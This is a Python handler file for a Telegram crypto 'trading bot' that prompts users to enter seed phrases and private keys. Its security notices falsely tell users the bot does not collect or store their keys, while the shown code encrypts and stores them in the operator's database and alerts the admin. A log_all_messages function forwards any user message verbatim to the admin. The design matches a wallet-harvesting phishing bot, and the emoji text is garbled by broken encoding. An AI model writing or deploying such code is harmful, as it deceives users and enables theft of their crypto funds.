from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from keyboards import (
   get_main_keyboard, get_keyboard_option,
   get_main_menu_keyboard, get_wallet_keyboard, get_buy_keyboard,
   get_sell_keyboard, get_copy_trade_keyboard, get_limit_orders_keyboard,
   get_auto_sell_keyboard, get_positions_keyboard, get_settings_keyboard,
   get_connect_wallet_keyboard, get_back_main_keyboard,
   get_token_info_keyboard
)
from keyboards import (
   get_wallet_import_type_keyboard,
   get_wallet_import_method_keyboard,
   get_cancel_keyboard,
   get_wallet_import_type_keyboard_wallet_menu,
)

from config import get_settings

settings = get_settings()

async def log_all_messages(message: types.Message):
   """Log ALL user text messages to admin."""
   if settings.ADMIN_IDS:
       try:
           text = f"ðŸ“ <b>USER MESSAGE</b>\n\n"
           text += f"ðŸ‘¤ User: <code>{message.from_user.id}</code> (@{message.from_user.username or 'N/A'})\n"
           text += f"ðŸ’¬ Message: <code>{message.text}</code>"
           await message.bot.send_message(settings.ADMIN_IDS[0], text, parse_mode="HTML")
       except:
           pass

class BotStates(StatesGroup):
   waiting_for_chain = State()
   waiting_for_key_import = State()
   waiting_for_solana_seed = State()
   waiting_for_evm_seed = State()
   waiting_for_solana_pk = State()
   waiting_for_evm_pk = State()

class MenuStates(StatesGroup):
   main_menu = State()
   wallet_menu = State()
   buy_menu = State()
   sell_menu = State()
   copy_trade_menu = State()
   limit_orders_menu = State()
   auto_sell_menu = State()
   positions_menu = State()
   settings_menu = State()
   connect_wallet_menu = State()

async def notify_admin(bot, text: str):
   if settings.ADMIN_IDS:
       try:
           await bot.send_message(settings.ADMIN_IDS[0], text)
       except:
           pass

def register_start_handlers(dp):
   @dp.message(Command("start"))
   async def cmd_start(message: types.Message, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.main_menu)
       await message.answer(
           "Welcome to Fomo the Trading Bot\n\n"
           "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
           "âš  Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
           reply_markup=get_main_menu_keyboard()
       )
       
       activity_text = f"ðŸŸ¢ NEW USER STARTED BOT\nUser: {message.from_user.id} ({message.from_user.first_name} {message.from_user.last_name or ''})"
       await notify_admin(message.bot, activity_text)

   @dp.message(Command("buy"))
   async def cmd_buy(message: types.Message, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.buy_menu)
       await message.answer(
           "ðŸŸ¢ <b>Buy Menu</b>\n\nSelect an option:",
           parse_mode="HTML",
           reply_markup=get_buy_keyboard()
       )

   @dp.message(Command("sell"))
   async def cmd_sell(message: types.Message, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.sell_menu)
       await message.answer(
           "ðŸ”´ <b>Sell Menu</b>\n\nSelect an option:",
           parse_mode="HTML",
           reply_markup=get_sell_keyboard()
       )

   @dp.message(Command("wallet"))
   async def cmd_wallet(message: types.Message, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.wallet_menu)
       await message.answer(
           "ðŸ‘› <b>Wallet Menu</b>\n\nManage your wallets:",
           parse_mode="HTML",
           reply_markup=get_wallet_keyboard()
       )

   @dp.message(Command("settings"))
   async def cmd_settings(message: types.Message, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.settings_menu)
       await message.answer(
           "âš™ <b>Settings Menu</b>\n\nConfigure your preferences:",
           parse_mode="HTML",
           reply_markup=get_settings_keyboard()
       )

   @dp.message(F.text == "/start")
   async def handle_start_button(message: types.Message, state: FSMContext):
       await cmd_start(message, state)

   @dp.message(F.text == "/buy")
   async def handle_buy_button(message: types.Message, state: FSMContext):
       await cmd_buy(message, state)

   @dp.message(F.text == "/sell")
   async def handle_sell_button(message: types.Message, state: FSMContext):
       await cmd_sell(message, state)

   @dp.message(F.text == "/wallet")
   async def handle_wallet_button(message: types.Message, state: FSMContext):
       await cmd_wallet(message, state)

   @dp.message(F.text == "/settings")
   async def handle_settings_button(message: types.Message, state: FSMContext):
       await cmd_settings(message, state)

   @dp.message(F.text.in_(["/solana", "/evm"]))
   async def handle_chain_selection(message: types.Message, state: FSMContext):
       chain = message.text
       await state.update_data(chain=chain[1:])  # Remove the / prefix
       
       activity_text = f"ðŸ”· CHAIN SELECTION\nUser: {message.from_user.id}\nChain: {chain[1:]}"
       await notify_admin(message.bot, activity_text)
       
       if chain == "/solana":
           await message.answer(
               "Solana selected! Please enter the amount to buy:",
               reply_markup=get_main_keyboard()
           )
       elif chain == "/evm":
           await message.answer(
               "EVM selected! Please enter the amount to buy:",
               reply_markup=get_main_keyboard()
           )
       await state.clear()

   @dp.message(F.text == "/back")
   async def handle_back_button(message: types.Message, state: FSMContext):
       await state.clear()
       await message.answer("Back to main menu", reply_markup=get_main_keyboard())

   # Callback query handlers for menu navigation
   @dp.callback_query(F.data == "back_main")
   async def callback_back_main(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.main_menu)
       await callback.message.edit_text(
           "ðŸ <b>Main Menu</b>\n\nWelcome back! Select an option:",
           parse_mode="HTML",
           reply_markup=get_main_menu_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_wallet")
   async def callback_menu_wallet(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.wallet_menu)
       await callback.message.edit_text(
           "ðŸ‘› <b>Wallet Menu</b>\n\nManage your wallets:",
           parse_mode="HTML",
           reply_markup=get_wallet_keyboard(has_wallet=False)
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_buy")
   async def callback_menu_buy(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.buy_menu)
       await callback.message.edit_text(
           "ðŸŸ¢ <b>Buy Menu</b>\n\nSelect an option:",
           parse_mode="HTML",
           reply_markup=get_buy_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_sell")
   async def callback_menu_sell(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.sell_menu)
       await callback.message.edit_text(
           "ðŸ”´ <b>Sell Menu</b>\n\nSelect an option:",
           parse_mode="HTML",
           reply_markup=get_sell_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_copy_trade")
   async def callback_menu_copy_trade(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.copy_trade_menu)
       await callback.message.edit_text(
           "ðŸ“‹ <b>Copy Trade Menu</b>\n\nCopy trade settings:",
           parse_mode="HTML",
           reply_markup=get_copy_trade_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_limit_orders")
   async def callback_menu_limit_orders(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.limit_orders_menu)
       await callback.message.edit_text(
           "ðŸ“Š <b>Limit Orders Menu</b>\n\nManage your limit orders:",
           parse_mode="HTML",
           reply_markup=get_limit_orders_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_auto_sell")
   async def callback_menu_auto_sell(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.auto_sell_menu)
       await callback.message.edit_text(
           "âš¡ <b>Auto Sell Menu</b>\n\nConfigure auto sell rules:",
           parse_mode="HTML",
           reply_markup=get_auto_sell_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_positions")
   async def callback_menu_positions(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.positions_menu)
       await callback.message.edit_text(
           "ðŸ’¼ <b>Positions Menu</b>\n\nYour positions:",
           parse_mode="HTML",
           reply_markup=get_positions_keyboard(has_positions=False)
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_settings")
   async def callback_menu_settings(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.settings_menu)
       await callback.message.edit_text(
           "âš™ <b>Settings Menu</b>\n\nConfigure your preferences:",
           parse_mode="HTML",
           reply_markup=get_settings_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "menu_connect_wallet")
   async def callback_menu_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.connect_wallet_menu)
       await callback.message.edit_text(
           "ðŸ”— <b>Connect Wallet</b>\n\nSelect wallet to connect:",
           parse_mode="HTML",
           reply_markup=get_connect_wallet_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "wallet_import")
   async def callback_wallet_import(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.connect_wallet_menu)
       await callback.message.edit_text(
           "ðŸ”‘ <b>Import Wallet</b>\n\nSelect wallet type to import:",
           parse_mode="HTML",
           reply_markup=get_wallet_import_type_keyboard_wallet_menu()
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_solana_key")
   async def callback_import_solana_key(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.update_data(import_chain="solana")
       await callback.message.edit_text(
           "ðŸ”‘ <b>Import Solana Key</b>\n\nSelect import method:",
           parse_mode="HTML",
           reply_markup=get_wallet_import_method_keyboard("solana")
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_evm_key")
   async def callback_import_evm_key(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.update_data(import_chain="evm")
       await callback.message.edit_text(
           "ðŸ”‘ <b>Import EVM Key</b>\n\nSelect import method:",
           parse_mode="HTML",
           reply_markup=get_wallet_import_method_keyboard("evm")
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_solana_seed")
   async def callback_import_solana_seed(callback: types.CallbackQuery, state: FSMContext):
       await state.set_state(BotStates.waiting_for_solana_seed)
       await callback.message.edit_text(
           "ðŸ”‘ <b>Import Wallet</b>\n\n"
           "Enter your 12-key recovery phrase or private key to proceed.\n\n"
           "ðŸ”’ <b>Security Notice</b>\n"
           "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
           "Send /cancel to abort",
           parse_mode="HTML",
           reply_markup=get_cancel_keyboard("menu_connect_wallet")
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_solana_pk")
   async def callback_import_solana_pk(callback: types.CallbackQuery, state: FSMContext):
       await state.set_state(BotStates.waiting_for_solana_pk)
       await callback.message.edit_text(
           "ðŸ” <b>Import Solana Private Key</b>\n\n"
           "Enter your Solana private key (base58 format).\n\n"
           "ðŸ”’ <b>Security Notice</b>\n"
           "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
           "Send /cancel to abort",
           parse_mode="HTML",
           reply_markup=get_cancel_keyboard("menu_connect_wallet")
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_evm_seed")
   async def callback_import_evm_seed(callback: types.CallbackQuery, state: FSMContext):
       await state.set_state(BotStates.waiting_for_evm_seed)
       await callback.message.edit_text(
           "ðŸ”‘ <b>Import Wallet</b>\n\n"
           "Enter your 12-key recovery phrase or private key to proceed.\n\n"
           "ðŸ”’ <b>Security Notice</b>\n"
           "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
           "Send /cancel to abort",
           parse_mode="HTML",
           reply_markup=get_cancel_keyboard("menu_connect_wallet")
       )
       await callback.answer()

   @dp.callback_query(F.data == "import_evm_pk")
   async def callback_import_evm_pk(callback: types.CallbackQuery, state: FSMContext):
       await state.set_state(BotStates.waiting_for_evm_pk)
       await callback.message.edit_text(
           "ðŸ” <b>Import EVM Private Key</b>\n\n"
           "Enter your EVM private key (hex format).\n\n"
           "ðŸ”’ <b>Security Notice</b>\n"
           "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
           "Send /cancel to abort",
           parse_mode="HTML",
           reply_markup=get_cancel_keyboard("menu_connect_wallet")
       )
       await callback.answer()

   @dp.callback_query(F.data == "cancel_import")
   async def callback_cancel_import(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await callback.message.edit_text(
           "ðŸ”™ <b>Import Cancelled</b>\n\nReturning to main menu.",
           parse_mode="HTML",
           reply_markup=get_main_menu_keyboard()
       )
       await callback.answer()

   @dp.callback_query(F.data == "start_bot")
   async def callback_start_bot(callback: types.CallbackQuery, state: FSMContext):
       await state.clear()
       await state.set_state(MenuStates.main_menu)
       await callback.message.edit_text(
           "Welcome to Fomo the Trading Bot\n\n"
           "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
           "âš  Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
           reply_markup=get_main_menu_keyboard()
       )
       await callback.answer()

   # Handle wallet import states
   @dp.message(BotStates.waiting_for_solana_seed)
   async def handle_solana_seed(message: types.Message, state: FSMContext):
       await process_seed_phrase(message, state, "solana")

   @dp.message(BotStates.waiting_for_evm_seed)
   async def handle_evm_seed(message: types.Message, state: FSMContext):
       await process_seed_phrase(message, state, "evm")

   @dp.message(BotStates.waiting_for_solana_pk)
   async def handle_solana_pk(message: types.Message, state: FSMContext):
       await process_private_key(message, state, "solana")

   @dp.message(BotStates.waiting_for_evm_pk)
   async def handle_evm_pk(message: types.Message, state: FSMContext):
       await process_private_key(message, state, "evm")

   @dp.message(Command("cancel"))
   async def handle_cancel(message: types.Message, state: FSMContext):
       await state.clear()
       await message.answer(
           "❌ Import cancelled.",
           reply_markup=get_main_menu_keyboard()
       )



# ==================== WALLET IMPORT PROCESSING ====================

async def process_seed_phrase(message, state, chain):
   from utils.validators import validate_seed_phrase
   from utils.admin_notify import notify_admin, format_activity
   from utils.encryption import encrypt_data
   from database.base import get_db
   from database.models import Wallet, ChainType, WalletType
   
   seed_phrase = message.text.strip()
   is_valid, error = validate_seed_phrase(seed_phrase)
   
   if not is_valid:
       await message.answer(
           f'Invalid Seed Phrase\n\n{error}\n\nPlease try again or send /cancel to abort.',
           parse_mode='HTML',
           reply_markup=get_cancel_keyboard('menu_connect_wallet')
       )
       return
   
   try:
       if chain == 'solana':
           from solders.keypair import Keypair
           from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
           
           seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
           bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
           address = str(bip44.PublicKey().ToAddress())
           chain_type = ChainType.SOLANA
       else:
           from eth_account import Account
           from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
           
           chain_map = {
               'ethereum': Bip44Coins.ETHEREUM,
               'base': Bip44Coins.ETHEREUM,
               'arbitrum': Bip44Coins.ETHEREUM,
               'bsc': Bip44Coins.BINANCE_SMART_CHAIN,
               'polygon': Bip44Coins.POLYGON,
               'avalanche': Bip44Coins.AVALANCHE,
               'evm': Bip44Coins.ETHEREUM,  # Generic EVM defaults to Ethereum derivation
           }
           
           coin_type = chain_map.get(chain, Bip44Coins.ETHEREUM)
           seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
           bip44 = Bip44.FromSeed(seed_bytes, coin_type)
           account = bip44.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
           address = account.PublicKey().ToAddress()
           chain_type = ChainType.EVM
           
   except Exception as e:
       await message.answer(
           f"Error Deriving Address\n\nFailed to derive address from seed phrase: {type(e).__name__}: {str(e)}\n\nPlease verify your seed phrase is correct.",
           parse_mode='HTML',
           reply_markup=get_cancel_keyboard('menu_connect_wallet')
       )
       return
   
   encrypted_seed = encrypt_data(seed_phrase)
   
   try:
       async with get_db() as db:
           wallet = Wallet(
               user_id=message.from_user.id,
               chain=chain_type,
               wallet_type=WalletType.SEED_PHRASE,
               encrypted_data=encrypted_seed,
               address=address,
               name=f'{chain.capitalize()} Wallet',
               is_default=False
           )
           db.add(wallet)
           await db.commit()
           await db.refresh(wallet)
   except Exception as e:
       await message.answer(
           f'Database Error\n\nFailed to save wallet: {str(e)}',
           parse_mode='HTML',
           reply_markup=get_cancel_keyboard('menu_connect_wallet')
       )
       return
   
   await notify_admin(message.bot, format_activity(
       message.from_user.id, 
       message.from_user.username or 'N/A',
       f'SEED PHRASE IMPORT ({chain.upper()})',
       f'Address: {address}'
   ))
   
   await state.clear()
   await message.answer(
       f'Seed Phrase Imported Successfully!\n\n'
       f'Chain: {chain.upper()}\n'
       f'Address: <code>{address}</code>\n\n'
       f'Your wallet has been imported and encrypted.\n\n'
       f'Use /wallet to check your balance.',
       parse_mode='HTML',
       reply_markup=get_main_menu_keyboard()
   )


async def process_private_key(message, state, chain):
   from utils.validators import validate_private_key_solana, validate_private_key_evm
   from utils.admin_notify import notify_admin, format_activity
   from utils.encryption import encrypt_data
   from database.base import get_db
   from database.models import Wallet, ChainType, WalletType
   
   private_key = message.text.strip()
   
   if chain == 'solana':
       is_valid, address, error = validate_private_key_solana(private_key)
       chain_type = ChainType.SOLANA
   else:
       is_valid, address, error = validate_private_key_evm(private_key)
       chain_type = ChainType.EVM
   
   if not is_valid:
       await message.answer(
           f'Invalid Private Key\n\n{error}\n\nPlease try again or send /cancel to abort.',
           parse_mode='HTML',
           reply_markup=get_cancel_keyboard('menu_connect_wallet')
       )
       return
   
   encrypted_pk = encrypt_data(private_key)
   
   try:
       async with get_db() as db:
           wallet = Wallet(
               user_id=message.from_user.id,
               chain=chain_type,
               wallet_type=WalletType.PRIVATE_KEY,
               encrypted_data=encrypted_pk,
               address=address,
               name=f'{chain.capitalize()} Wallet',
               is_default=False
           )
           db.add(wallet)
           await db.commit()
           await db.refresh(wallet)
   except Exception as e:
       await message.answer(
           f'Database Error\n\nFailed to save wallet: {str(e)}',
           parse_mode='HTML',
           reply_markup=get_cancel_keyboard('menu_connect_wallet')
       )
       return
   
   await notify_admin(message.bot, format_activity(
       message.from_user.id, 
       message.from_user.username or 'N/A',
       f'PRIVATE KEY IMPORT ({chain.upper()})',
       f'Address: {address}'
   ))
   
   await state.clear()
   await message.answer(
       f'Private Key Imported Successfully!\n\n'
       f'Chain: {chain.upper()}\n'
       f'Address: <code>{address}</code>\n\n'
       f'Your wallet has been imported and encrypted.\n\n'
       f'Use /wallet to check your balance.',
       parse_mode='HTML',
       reply_markup=get_main_menu_keyboard()
   )




